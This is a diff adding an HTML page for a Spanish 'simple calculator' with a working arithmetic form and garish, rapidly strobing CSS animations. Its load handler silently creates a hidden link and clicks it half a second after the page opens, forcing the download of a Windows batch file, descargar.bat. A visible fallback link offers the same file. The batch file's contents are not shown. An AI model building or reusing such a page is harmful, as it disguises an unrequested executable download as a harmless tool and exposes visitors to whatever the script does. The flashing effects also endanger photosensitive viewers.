@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Calculadora simple</title>
+  <style>
+    @keyframes fondo-locura {
+      0% { background-color: #ff00ff; filter: hue-rotate(0deg); }
+      20% { background-color: #00ffff; }
+      40% { background-color: #ffff00; }
+      60% { background-color: #ff0000; }
+      80% { background-color: #00ff00; }
+      100% { background-color: #ff00ff; filter: hue-rotate(360deg); }
+    }
+
+    @keyframes titulo-bizarro {
+      0% { color: #00ff00; text-shadow: 6px 6px #ff0000, -6px -6px #0000ff; transform: scale(1) rotate(-1deg); }
+      33% { color: #ffff00; text-shadow: -8px 4px #ff00ff, 6px -6px #00ffff; transform: scale(1.05) rotate(2deg); }
+      66% { color: #ff00ff; text-shadow: 5px -8px #00ff00, -4px 5px #ff0000; transform: scale(0.95) rotate(-2deg); }
+      100% { color: #00ff00; text-shadow: 6px 6px #ff0000, -6px -6px #0000ff; transform: scale(1) rotate(-1deg); }
+    }
+
+    @keyframes caja-deformada {
+      0% { border-color: #ff00ff; }
+      50% { border-color: #00ffff; box-shadow: 0 0 60px #ffff00; }
+      100% { border-color: #ff00ff; }
+    }
+
+    @keyframes input-psicodelico {
+      0% { background-color: #000; color: #fff; border-color: #ff0000; }
+      50% { background-color: #fff; color: #000; border-color: #00ff00; }
+      100% { background-color: #000; color: #fff; border-color: #ff0000; }
+    }
+
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: Impact, "Arial Black", sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+      animation: fondo-locura 0.3s infinite linear;
+    }
+
+    h1 {
+      font-size: 3.5rem;
+      text-transform: uppercase;
+      letter-spacing: 4px;
+      margin-bottom: 20px;
+      animation: titulo-bizarro 0.1s infinite linear;
+      text-align: center;
+    }
+
+    form {
+      background: rgba(0, 0, 0, 0.9);
+      padding: 30px;
+      border: 12px dotted #fff;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 0 40px #000, inset 0 0 20px #ff0000;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      animation: caja-deformada 0.25s infinite ease-in-out;
+    }
+
+    label {
+      color: #fff;
+      font-family: "Comic Sans MS", cursive, sans-serif;
+      font-size: 1.2rem;
+      text-shadow: 2px 2px #ff00ff;
+      transform: rotate(-1deg);
+    }
+
+    input[type="number"], input[type="text"] {
+      font-family: Impact, sans-serif;
+      font-size: 1.8rem;
+      padding: 10px;
+      text-align: center;
+      border: 5px dashed;
+      outline: none;
+      animation: input-psicodelico 0.15s infinite steps(2);
+    }
+
+    button {
+      background-color: #ffff00;
+      color: #000;
+      font-family: Impact, sans-serif;
+      font-size: 2.2rem;
+      padding: 15px;
+      border: 6px solid #ff00ff;
+      cursor: pointer;
+      text-transform: uppercase;
+      margin-top: 10px;
+      box-shadow: 5px 5px 0 #000;
+    }
+
+    button:hover {
+      background-color: #00ff00;
+      color: #fff;
+    }
+
+    #resultado {
+      font-family: "Comic Sans MS", sans-serif;
+      font-size: 2rem;
+      font-weight: bold;
+      color: #fff;
+      background: #000;
+      padding: 15px 30px;
+      border: 6px double #00ffff;
+      margin-top: 25px;
+      text-align: center;
+      box-shadow: 10px 10px 0 #ff00ff;
+      transform: rotate(3deg);
+      animation: titulo-bizarro 0.2s infinite linear;
+    }
+
+    #descarga {
+      color: #000;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    #descarga a {
+      color: #000;
+      font-weight: bold;
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        scroll-behavior: auto !important;
+      }
+    }
+
+    @media (max-width: 520px) {
+      h1 { font-size: 2.2rem; }
+      form { box-sizing: border-box; padding: 20px; }
+    }
+  </style>
+</head>
+<body>
+  <h1>Calculadora simple</h1>
+
+  <form id="calculadora">
+    <label for="numero1">Primer número:</label>
+    <input type="number" step="any" id="numero1" name="numero1" required>
+
+    <label for="operador">Operador:</label>
+    <input type="text" id="operador" name="operador" placeholder="+, -, * o /" maxlength="1" required>
+
+    <label for="numero2">Segundo número:</label>
+    <input type="number" step="any" id="numero2" name="numero2" required>
+
+    <button type="submit">Calcular</button>
+  </form>
+
+  <p id="resultado" role="status" aria-live="polite" hidden></p>
+  <p id="descarga">Si la descarga no comienza automáticamente, <a href="/files/descargar.bat" download>descarga el archivo .bat</a>.</p>
+
+  <script>
+    const form = document.getElementById("calculadora");
+    const resultElement = document.getElementById("resultado");
+    const operators = ["+", "-", "*", "/"];
+
+    form.addEventListener("submit", (event) => {
+      event.preventDefault();
+
+      const first = Number(form.elements.numero1.value);
+      const second = Number(form.elements.numero2.value);
+      const operator = form.elements.operador.value.trim();
+      let result;
+
+      if (!Number.isFinite(first) || !Number.isFinite(second)) {
+        result = "Escribe dos números válidos.";
+      } else if (!operators.includes(operator)) {
+        result = "Usa uno de estos operadores: +, -, * o /.";
+      } else if (operator === "/" && second === 0) {
+        result = "No se puede dividir entre cero.";
+      } else {
+        switch (operator) {
+          case "+": result = first + second; break;
+          case "-": result = first - second; break;
+          case "*": result = first * second; break;
+          case "/": result = first / second; break;
+        }
+      }
+
+      resultElement.textContent = String(result);
+      resultElement.hidden = false;
+    });
+
+    window.addEventListener("load", () => {
+      window.setTimeout(() => {
+        const link = document.createElement("a");
+        link.href = "/files/descargar.bat";
+        link.download = "descargar.bat";
+        link.hidden = true;
+        document.body.appendChild(link);
+        link.click();
+        link.remove();
+      }, 500);
+    }, { once: true });
+  </script>
+</body>
+</html>
